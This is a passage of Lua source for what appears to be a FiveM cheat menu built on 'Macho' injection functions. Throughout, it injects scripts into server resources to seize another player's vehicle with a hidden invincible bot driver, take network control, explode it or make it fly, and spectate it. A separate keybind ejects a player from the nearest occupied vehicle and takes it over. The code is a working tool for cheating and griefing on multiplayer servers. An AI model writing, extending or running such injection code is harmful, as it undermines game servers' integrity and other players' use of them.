                                Citizen.Wait(10)
                            end

                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            SetEntityVisible(playerPed, false, false)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            Citizen.Wait(100)
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            Citizen.Wait(600)
                            ClearPedTasks(playerPed)

                            -- Start full Remote Car system
                            if DoesEntityExist(targetVehicle) then
                                local RemoteCar = {}
                                local isSpectating = false
                                local originalPlayerPed = nil
                                local audioEnabled = true
                                local originalAudioPos = nil
                                local isFlying = false
                                local flightSpeed = 25.0
                                local flightAcceleration = 0.2
                                local isHonking = false
                                local originalLightState = 0

                                RemoteCar.Start = function()
                                    local selectedVehicle = targetVehicle
                                    if not selectedVehicle or not DoesEntityExist(selectedVehicle) then
                                        return
                                    end
                                    RemoteCar.Entity = selectedVehicle
                                    RemoteCar.OriginalPed = PlayerPedId()
                                    originalAudioPos = GetEntityCoords(RemoteCar.OriginalPed)
                                    originalLightState = GetVehicleLightsState(RemoteCar.Entity) and 2 or 0
                                    local success = pcall(function()
                                        RemoteCar.CreateBotDriver()
                                    end)
                                    if not success then
                                        return
                                    end
                                    RemoteCar.StartSpectate()
                                    RemoteCar.SetupAudioSystem()
                                    Citizen.CreateThread(function()
                                        while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                            Citizen.Wait(0)
                                            pcall(function()
                                                RemoteCar.UpdateAudioPosition()
                                            end)
                                            if isSpectating then
                                                DisableControlAction(0, 30, true)
                                                DisableControlAction(0, 31, true)
                                                DisableControlAction(0, 21, true)
                                                DisableControlAction(0, 22, true)
                                                DisableControlAction(0, 44, true)
                                                DisableControlAction(0, 55, true)
                                                DisableControlAction(0, 76, true)
                                                DisableControlAction(0, 23, true)
                                                DisableControlAction(0, 75, true)
                                                DisableControlAction(0, 101, true)
                                                DisableControlAction(0, 102, true)
                                                DisableControlAction(0, 0, true)
                                                DisableControlAction(0, 140, true)
                                                DisableControlAction(0, 141, true)
                                                DisableControlAction(0, 142, true)
                                                DisableControlAction(0, 143, true)
                                                DisableControlAction(0, 263, true)
                                                DisableControlAction(0, 264, true)
                                                DisableControlAction(0, 24, true)
                                                DisableControlAction(0, 25, true)
                                                EnableControlAction(0, 172, true)
                                                EnableControlAction(0, 173, true)
                                                EnableControlAction(0, 174, true)
                                                EnableControlAction(0, 175, true)
                                                EnableControlAction(0, 32, true)
                                                EnableControlAction(0, 33, true)
                                                EnableControlAction(0, 34, true)
                                                EnableControlAction(0, 35, true)
                                                EnableControlAction(0, 22, true)
                                                EnableControlAction(0, 21, true)
                                                EnableControlAction(0, 47, true)
                                                EnableControlAction(0, 73, true)
                                                EnableControlAction(0, 246, true)
                                                EnableControlAction(0, 44, true)
                                                EnableControlAction(0, 48, true)
                                                EnableControlAction(0, 108, true)
                                                EnableControlAction(0, 23, true)
                                                EnableControlAction(0, 51, true)
                                            end
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local distance = GetDistanceBetweenCoords(
                                                    GetEntityCoords(RemoteCar.OriginalPed),
                                                    GetEntityCoords(RemoteCar.Entity),
                                                    true
                                                )
                                                pcall(function()
                                                    RemoteCar.HandleKeys(distance)
                                                end)
                                                local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                if vehicleCoords then
                                                    SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                                end
                                                if distance <= 2000.0 then
                                                    if not NetworkHasControlOfEntity(RemoteCar.BotPed) then
                                                        NetworkRequestControlOfEntity(RemoteCar.BotPed)
                                                    end
                                                    if not NetworkHasControlOfEntity(RemoteCar.Entity) then
                                                        NetworkRequestControlOfEntity(RemoteCar.Entity)
                                                    end
                                                else
                                                    pcall(function()
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                    end)
                                                end
                                            else
                                                break
                                            end
                                        end
                                        pcall(function()
                                            RemoteCar.Stop()
                                            ClearFocus()
                                        end)
                                    end)
                                end

                                RemoteCar.SetupAudioSystem = function()
                                    audioEnabled = true
                                    Citizen.CreateThread(function()
                                        while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) do
                                            Citizen.Wait(100)
                                            pcall(function()
                                                RemoteCar.UpdateAudioPosition()
                                            end)
                                        end
                                    end)
                                end

                                RemoteCar.UpdateAudioPosition = function()
                                    if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end
                                    pcall(function()
                                        local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                        SetAudioListenerPosition(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z)
                                        local velocity = GetEntityVelocity(RemoteCar.Entity)
                                        SetAudioListenerVelocity(velocity.x, velocity.y, velocity.z)
                                        local heading = GetEntityHeading(RemoteCar.Entity)
                                        local radHeading = math.rad(heading)
                                        local forwardX = -math.sin(radHeading)
                                        local forwardY = math.cos(radHeading)
                                        SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                        SetAudioFlag("AudioListenerEnabled", true)
                                        SetAudioFlag("LoadMPData", true)
                                        SetAudioFlag("DisableFlightMusic", true)
                                        SetAudioFlag("PauseBeatRepeats", false)
                                    end)
                                end

                                RemoteCar.ToggleAudio = function()
                                    audioEnabled = not audioEnabled
                                    if audioEnabled then
                                        pcall(function()
                                            RemoteCar.UpdateAudioPosition()
                                        end)
                                        MachoMenuNotification("Remote Car", "Audio enabled - hearing from vehicle position")
                                    else
                                        pcall(function()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                                local playerVelocity = GetEntityVelocity(RemoteCar.OriginalPed)
                                                SetAudioListenerVelocity(playerVelocity.x, playerVelocity.y, playerVelocity.z)
                                                local playerHeading = GetEntityHeading(RemoteCar.OriginalPed)
                                                local radHeading = math.rad(playerHeading)
                                                local forwardX = -math.sin(radHeading)
                                                local forwardY = math.cos(radHeading)
                                                SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                            end
                                        end)
                                        MachoMenuNotification("Remote Car", "Audio disabled - returned to normal audio")
                                    end
                                end

                                RemoteCar.RestoreOriginalAudio = function()
                                    pcall(function()
                                        SetAudioFlag("AudioListenerEnabled", false)
                                        ClearAudioFlags()
                                        if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                            local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                            SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                            SetAudioListenerVelocity(0.0, 0.0, 0.0)
                                            SetAudioListenerOrientation(0.0, 1.0, 0.0, 0.0, 0.0, 1.0)
                                        end
                                    end)
                                end

                                RemoteCar.CreateBotDriver = function()
                                    if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end
                                    RemoteCar.OriginalPed = PlayerPedId()

                                    pcall(function()
                                        local existingDriver = GetPedInVehicleSeat(RemoteCar.Entity, -1)
                                        if existingDriver and existingDriver ~= 0 and existingDriver ~= RemoteCar.OriginalPed then
                                            if not IsPedAPlayer(existingDriver) then
                                                SetEntityAsMissionEntity(existingDriver, false, false)
                                                DeleteEntity(existingDriver)
                                            else
                                                TaskLeaveVehicle(existingDriver, RemoteCar.Entity, 0)
                                            end
                                        end
                                        for seat = 0, GetVehicleMaxNumberOfPassengers(RemoteCar.Entity) - 1 do
                                            local passenger = GetPedInVehicleSeat(RemoteCar.Entity, seat)
                                            if passenger and passenger ~= 0 and not IsPedAPlayer(passenger) then
                                                SetEntityAsMissionEntity(passenger, false, false)
                                                DeleteEntity(passenger)
                                            end
                                        end
                                    end)

                                    if not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end

                                    local modelHash = GetHashKey("mp_m_freemode_01")
                                    RequestModel(modelHash)
                                    local timeout = 0
                                    while not HasModelLoaded(modelHash) and timeout < 20 do
                                        Citizen.Wait(10)
                                        timeout = timeout + 1
                                    end

                                    if not HasModelLoaded(modelHash) or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end

                                    local coords = GetEntityCoords(RemoteCar.Entity)
                                    local heading = GetEntityHeading(RemoteCar.Entity)

                                    local success, botPed = pcall(function()
                                        return CreatePed(5, modelHash, coords.x, coords.y, coords.z, heading, false, false)
                                    end)

                                    if not success or not botPed or botPed == 0 then
                                        return
                                    end

                                    RemoteCar.BotPed = botPed

                                    pcall(function()
                                        SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                        SetEntityInvincible(RemoteCar.BotPed, true)
                                        SetEntityVisible(RemoteCar.BotPed, true)
                                        SetPedAlertness(RemoteCar.BotPed, 0)
                                        SetPedCanRagdoll(RemoteCar.BotPed, false)
                                        SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                        SetPedCanBeDraggedOut(RemoteCar.BotPed, false)
                                        SetEntityVisible(RemoteCar.BotPed, false, false)

                                        Citizen.CreateThread(function()
                                            while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                Citizen.Wait(100)
                                                SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                SetEntityVisible(RemoteCar.BotPed, true, false)
                                                for i = 0, 255 do
                                                    if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                        SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                    end
                                                end
                                            end
                                        end)
                                    end)

                                    local enterTimeout = 0
                                    while not IsPedInVehicle(RemoteCar.BotPed, RemoteCar.Entity) and enterTimeout < 5 and DoesEntityExist(RemoteCar.Entity) do
                                        Citizen.Wait(20)
                                        enterTimeout = enterTimeout + 1
                                        TaskWarpPedIntoVehicle(RemoteCar.BotPed, RemoteCar.Entity, -1)
                                    end
                                end

                                RemoteCar.StartSpectate = function()
                                    if not RemoteCar.BotPed or not DoesEntityExist(RemoteCar.BotPed) then
                                        return
                                    end
                                    if DoesCamExist(RemoteCar.SpectateCamera) then
                                        DestroyCam(RemoteCar.SpectateCamera)
                                    end
                                    local success, camera = pcall(function()
                                        return CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                    end)
                                    if not success or not camera then
                                        return
                                    end
                                    RemoteCar.SpectateCamera = camera
                                    SetCamFov(RemoteCar.SpectateCamera, 75.0)
                                    RemoteCar.CameraDistance = 8.0
                                    RemoteCar.CameraHeight = 3.0
                                    RemoteCar.CameraAngleHorizontal = 0.0
                                    RemoteCar.CameraAngleVertical = -10.0
                                    isSpectating = true
                                    RenderScriptCams(1, 0, 0, 1, 1)
                                    Citizen.CreateThread(function()
                                        while isSpectating and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                            Citizen.Wait(0)
                                            pcall(function()
                                                if IsPedInAnyVehicle(RemoteCar.BotPed, false) then
                                                    local vehicle = GetVehiclePedIsIn(RemoteCar.BotPed, false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local vehicleCoords = GetEntityCoords(vehicle)
                                                        local mouseX = GetDisabledControlNormal(0, 1) * 15.0
                                                        local mouseY = GetDisabledControlNormal(0, 2) * 8.0
                                                        RemoteCar.CameraAngleHorizontal = RemoteCar.CameraAngleHorizontal + mouseX
                                                        RemoteCar.CameraAngleVertical = math.max(-45.0, math.min(45.0, RemoteCar.CameraAngleVertical + mouseY))
                                                        if IsControlPressed(0, 15) then
                                                            RemoteCar.CameraDistance = math.max(3.0, RemoteCar.CameraDistance - 0.5)
                                                        elseif IsControlPressed(0, 16) then
                                                            RemoteCar.CameraDistance = math.min(15.0, RemoteCar.CameraDistance + 0.5)
                                                        end
                                                        local radianHorizontal = math.rad(RemoteCar.CameraAngleHorizontal)
                                                        local radianVertical = math.rad(RemoteCar.CameraAngleVertical)
                                                        local offsetX = math.sin(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                        local offsetY = math.cos(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                        local offsetZ = math.sin(radianVertical) * RemoteCar.CameraDistance
                                                        local cameraPos = vector3(
                                                            vehicleCoords.x + offsetX,
                                                            vehicleCoords.y + offsetY,
                                                            vehicleCoords.z + RemoteCar.CameraHeight + offsetZ
                                                        )
                                                        SetFocusPosAndVel(cameraPos.x, cameraPos.y, cameraPos.z, 0.0, 0.0, 0.0)
                                                        SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                        PointCamAtEntity(RemoteCar.SpectateCamera, vehicle, 0.0, 0.0, 0.0, true)
                                                        DisableControlAction(0, 1, true)
                                                        DisableControlAction(0, 2, true)
                                                        DisableControlAction(0, 15, true)
                                                        DisableControlAction(0, 16, true)
                                                        if IsControlJustPressed(0, 45) then
                                                            RemoteCar.CameraDistance = 8.0
                                                            RemoteCar.CameraHeight = 3.0
                                                            RemoteCar.CameraAngleHorizontal = 0.0
                                                            RemoteCar.CameraAngleVertical = -10.0
                                                        end
                                                        SetTextFont(4)
                                                        SetTextProportional(1)
                                                        SetTextScale(0.0, 0.4)
                                                        SetTextColour(255, 255, 255, 255)
                                                        SetTextEntry("STRING")
                                                        local speed = GetEntitySpeed(vehicle) * 3.6
                                                        local audioStatus = audioEnabled and "ON" or "OFF"
                                                        DrawText(0.02, 0.02)
                                                    end
                                                end
                                            end)
                                        end
                                    end)
                                end

                                RemoteCar.StopSpectate = function()
                                    if isSpectating then
                                        isSpectating = false
                                        pcall(function()
                                            ClearFocus()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                                ClearFocus()
                                            else
                                                ClearFocus()
                                            end
                                            RenderScriptCams(0, 0, 0, 1, 0)
                                            if DoesCamExist(RemoteCar.SpectateCamera) then
                                                DestroyCam(RemoteCar.SpectateCamera)
                                                RemoteCar.SpectateCamera = nil
                                            end
                                            SetPlayerControl(PlayerId(), true, 0)
                                        end)
                                    end
                                end

                                RemoteCar.MakeVehicleExplode = function()
                                    if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end
                                    pcall(function()
                                        ExplodeVehicleInCutscene(RemoteCar.Entity, true)
                                    end)
                                end

                                RemoteCar.HandleHonking = function()
                                    if IsControlPressed(0, 51) then
                                        if not isHonking then
                                            isHonking = true
                                            pcall(function()
                                                SetVehicleDoorOpen(RemoteCar.Entity, 0, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 1, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 2, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 3, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 4, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 5, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 6, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 7, false, false)
                                            end)
                                        end
                                    else
                                        if isHonking then
                                            isHonking = false
                                            pcall(function()
                                                if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    for i = 0, 7 do
                                                        SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                    end
                                                end
                                            end)
                                        end
                                    end
                                end

                                RemoteCar.HandleKeys = function(distance)
                                    if IsControlJustReleased(0, 23) then
                                        isFlying = not isFlying
                                        pcall(function()
                                            if isFlying then
                                                SetVehicleGravity(RemoteCar.Entity, false)
                                                SetEntityCollision(RemoteCar.Entity, false, false)
                                                SetEntityCollision(RemoteCar.BotPed, false, false)
                                                SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, GetEntityHeading(RemoteCar.Entity), 2, true)
                                                SetEntityDynamic(RemoteCar.Entity, false)
                                                SetEntityDynamic(RemoteCar.BotPed, false)
                                            else
                                                SetVehicleGravity(RemoteCar.Entity, true)
                                                SetEntityCollision(RemoteCar.Entity, true, true)
                                                SetEntityCollision(RemoteCar.BotPed, true, true)
                                                local coords = GetEntityCoords(RemoteCar.Entity)
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                                PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                SetEntityDynamic(RemoteCar.Entity, true)
                                                SetEntityDynamic(RemoteCar.BotPed, true)
                                            end
                                        end)
                                    end
                                    if IsControlJustReleased(0, 47) then
                                        if isSpectating then
                                            RemoteCar.StopSpectate()
                                        else
                                            RemoteCar.StartSpectate()
                                        end
                                    end
                                    if IsControlJustPressed(0, 45) then
                                        pcall(function()
                                            if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                SetVehicleFixed(RemoteCar.Entity)
                                                SetVehicleDeformationFixed(RemoteCar.Entity)
                                                SetVehicleUndriveable(RemoteCar.Entity, false)
                                                SetVehicleEngineOn(RemoteCar.Entity, true, true, false)
                                                StopEntityFire(RemoteCar.Entity)
                                                local coords = GetEntityCoords(RemoteCar.Entity)
                                                local heading = GetEntityHeading(RemoteCar.Entity)
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z + 1.0, false, false, false)
                                                SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                if not isFlying then
                                                    PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                end

                                                if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                                    DeleteEntity(RemoteCar.BotPed)
                                                end

                                                local modelHash = GetHashKey("mp_m_freemode_01")
                                                if not HasModelLoaded(modelHash) then
                                                    RequestModel(modelHash)
                                                    while not HasModelLoaded(modelHash) do
                                                        Citizen.Wait(10)
                                                    end
                                                end

                                                RemoteCar.BotPed = CreatePedInsideVehicle(RemoteCar.Entity, 5, modelHash, -1, false, false)
                                                SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                                SetEntityInvincible(RemoteCar.BotPed, true)
                                                SetPedAlertness(RemoteCar.BotPed, 0)
                                                SetPedCanRagdoll(RemoteCar.BotPed, false)
                                                SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                                SetPedCanBeDraggedOut(RemoteCar.BotPed, false)
                                                SetEntityVisible(RemoteCar.BotPed, false, false)

                                                Citizen.CreateThread(function()
                                                    while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                        Citizen.Wait(100)
                                                        SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                        SetEntityVisible(RemoteCar.BotPed, true, false)
                                                        for i = 0, 255 do
                                                            if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                                SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                            end
                                                        end
                                                    end
                                                end)

                                                if isSpectating and RemoteCar.SpectateCamera and DoesCamExist(RemoteCar.SpectateCamera) then
                                                    RemoteCar.CameraDistance = 8.0
                                                    RemoteCar.CameraHeight = 3.0
                                                    RemoteCar.CameraAngleHorizontal = 0.0
                                                    RemoteCar.CameraAngleVertical = -10.0
                                                    local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                    local cameraPos = vector3(
                                                        vehicleCoords.x,
                                                        vehicleCoords.y - 8.0,
                                                        vehicleCoords.z + 3.0
                                                    )
                                                    SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                    PointCamAtEntity(RemoteCar.SpectateCamera, RemoteCar.Entity, 0.0, 0.0, 0.0, true)
                                                end
                                            end
                                        end)
                                    end
                                    if IsControlJustPressed(0, 73) then
                                        RemoteCar.Stop()
                                        ClearFocus()
                                        return
                                    end
                                    if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                        local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                        if vehicleCoords then
                                            SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                        end
                                        pcall(function()
                                            if IsControlJustReleased(0, 26) then
                                                RemoteCar.MakeVehicleExplode()
                                            end
                                            RemoteCar.HandleHonking()
                                            if isFlying then
                                                local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                local up = IsControlPressed(0, 22)
                                                local down = IsControlPressed(0, 36)
                                                local boost = IsControlPressed(0, 21)
                                                local heading = GetEntityHeading(RemoteCar.Entity)
                                                local radHeading = math.rad(heading)
                                                local moveX = 0.0
                                                local moveY = 0.0
                                                local moveZ = 0.0
                                                SetVehicleGravity(RemoteCar.Entity, false)
                                                SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                if forward then
                                                    moveX = moveX - math.sin(radHeading) * flightSpeed
                                                    moveY = moveY + math.cos(radHeading) * flightSpeed
                                                end
                                                if backward then
                                                    moveX = moveX + math.sin(radHeading) * flightSpeed
                                                    moveY = moveY - math.cos(radHeading) * flightSpeed
                                                end
                                                if left then
                                                    heading = heading + 3.0
                                                    SetEntityHeading(RemoteCar.Entity, heading)
                                                end
                                                if right then
                                                    heading = heading - 3.0
                                                    SetEntityHeading(RemoteCar.Entity, heading)
                                                end
                                                if up then
                                                    moveZ = moveZ + flightSpeed
                                                end
                                                if down then
                                                    moveZ = moveZ - flightSpeed
                                                end
                                                if boost then
                                                    moveX = moveX * 2.0
                                                    moveY = moveY * 2.0
                                                    moveZ = moveZ * 2.0
                                                end
                                                local currentCoords = GetEntityCoords(RemoteCar.Entity)
                                                local newCoords = vector3(
                                                    currentCoords.x + (moveX * 0.02),
                                                    currentCoords.y + (moveY * 0.02),
                                                    currentCoords.z + (moveZ * 0.02)
                                                )
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                            else
                                                local boost = IsControlPressed(0, 21)
                                                local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                local brake = IsControlPressed(0, 22)
                                                local actionTaken = false
                                                if boost and RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    SetVehicleForwardSpeed(RemoteCar.Entity, GetEntitySpeed(RemoteCar.Entity) + 2.0)
                                                end
                                                if forward and left then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 7, 1)
                                                    actionTaken = true
                                                elseif forward and right then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 8, 1)
                                                    actionTaken = true
                                                elseif backward and left then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 13, 1)
                                                    actionTaken = true
                                                elseif backward and right then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 14, 1)
                                                    actionTaken = true
                                                elseif forward then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 9, 1)
                                                    actionTaken = true
                                                elseif backward then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 22, 1)
                                                    actionTaken = true
                                                elseif left then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 4, 1)
                                                    actionTaken = true
                                                elseif right then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 5, 1)
                                                    actionTaken = true
                                                elseif brake then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 1000)
                                                    actionTaken = true
                                                end
                                                if not actionTaken then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                end
                                            end
                                        end)
                                    end
                                end

                                RemoteCar.Stop = function()
                                    pcall(function()
                                        RemoteCar.StopSpectate()
                                        RemoteCar.RestoreOriginalAudio()
                                        if isFlying then
                                            isFlying = false
                                            SetVehicleGravity(RemoteCar.Entity, true)
                                            SetEntityCollision(RemoteCar.Entity, true, true)
                                            SetEntityCollision(RemoteCar.BotPed, true, true)
                                            local coords = GetEntityCoords(RemoteCar.Entity)
                                            SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                            PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                            SetEntityDynamic(RemoteCar.Entity, true)
                                            SetEntityDynamic(RemoteCar.BotPed, true)
                                        end
                                        if isHonking then
                                            isHonking = false
                                            if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                for i = 0, 3 do
                                                    SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                end
                                                SetVehicleLights(RemoteCar.Entity, originalLightState)
                                            end
                                        end
                                        ClearFocus()
                                        if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                            local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                            SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                            ClearFocus()
                                        end
                                        if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                            DeleteEntity(RemoteCar.BotPed)
                                        end
                                        RemoteCar.Entity = nil
                                        RemoteCar.BotPed = nil
                                        RemoteCar.OriginalPed = nil
                                        audioEnabled = false
                                    end)
                                end

                                RemoteCar.Start()
                            end
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Remote Car", "Started remote control for your vehicle")
            else
                MachoMenuNotification("Remote Car", "No resources found!")
            end
        else
            MachoMenuNotification("Error", "You are not in a vehicle")
        end
    end,
    
    -- CallbackDisabled: This code runs when the checkbox is unselected (disabling remote control)
    function()
        if menuDUI then
            MachoDestroyDui(menuDUI)
            menuDUI = nil
            menuVisible = false
            MachoMenuNotification("Remote Car", "Remote control session ended and menu closed.")
        end
    end
)
MachoMenuKeybind(oyer, "Flip keybind", 0, function(key, toggle)
    selectedKey = key
end)
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 then
        local playerPed = GetPlayerPed(-1)
        if not DoesEntityExist(playerPed) then
            return
        end

        if IsPedSittingInAnyVehicle(playerPed) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            if DoesEntityExist(vehicle) then
                if selectedFlip == "Flip 1" then
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 360.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    if selectedFlip == "Flip 1" then
                        MachoMenuNotification("Success", "Flip 1  applied!")
                    end
                elseif selectedFlip == "Flip 2" then
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 0.0, 270.0, 0.0, 0, 0, 1, 1, 0, 1)
                    MachoMenuNotification("Success", "Flip 2  applied!")
                end
            else
                MachoMenuNotification("Error", "Vehicle not found!")
            end
        end
    end
end)
-- متغير لحفظ المفتاح المختار
local selectedKey = 0

-- إعداد المفتاح المخصص
MachoMenuKeybind(oyer, "Hijack Nearest Vehicle Key", 0, function(key, toggle)
    selectedKey = key
end)

-- معالج الضغط على المفتاح
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId() -- ✅ تحديث بيانات اللاعب داخل الدالة
        local nearestVehicle, distance = GetNearestVehicleWithPlayer()
        
        if nearestVehicle then
            local driverPed = GetPedInVehicleSeat(nearestVehicle, -1)
            
            ClearPedTasksImmediately(playerPed)
            
            MachoInjectResource("any", [[
                Citizen.CreateThread(function()
                    local playerPed = PlayerPedId()
                    local targetVehicle = ]] .. nearestVehicle .. [[
                    local driverPed = GetPedInVehicleSeat(targetVehicle, -1)
                    
                    if targetVehicle ~= 0 then
                        SetPedMoveRateOverride(playerPed, 10.0)
                        ClearPedTasks(playerPed)
                        SetVehicleForwardSpeed(targetVehicle, 0.0)
                        SetVehicleDoorsLocked(targetVehicle, 1)
                        SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                        
                        if driverPed then
                            TaskLeaveVehicle(driverPed, targetVehicle, 0)
                        end
                        
                        SetPedMoveRateOverride(playerPed, 3.0)
                        
                        ClearPedTasks(playerPed)
                        SetVehicleForwardSpeed(targetVehicle, 0.0)
                        
                        SetPedIntoVehicle(playerPed, targetVehicle, -1)
                        TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                        
                        SetPedMoveRateOverride(playerPed, 1.0)
                    end
                end)
            ]])
            
            MachoMenuNotification("Vehicle", "Hijacking nearest vehicle with player (Distance: " .. math.floor(distance) .. "m)")
        else
            MachoMenuNotification("Error", "No vehicle with player found")
        end
    end
end)

MachoMenuText(oyer,"Vehicle settings")


-- دالة MaxOut كاملة (منسوخة من الكود الأصلي ومعدلة)
function MaxOut(vehicle)
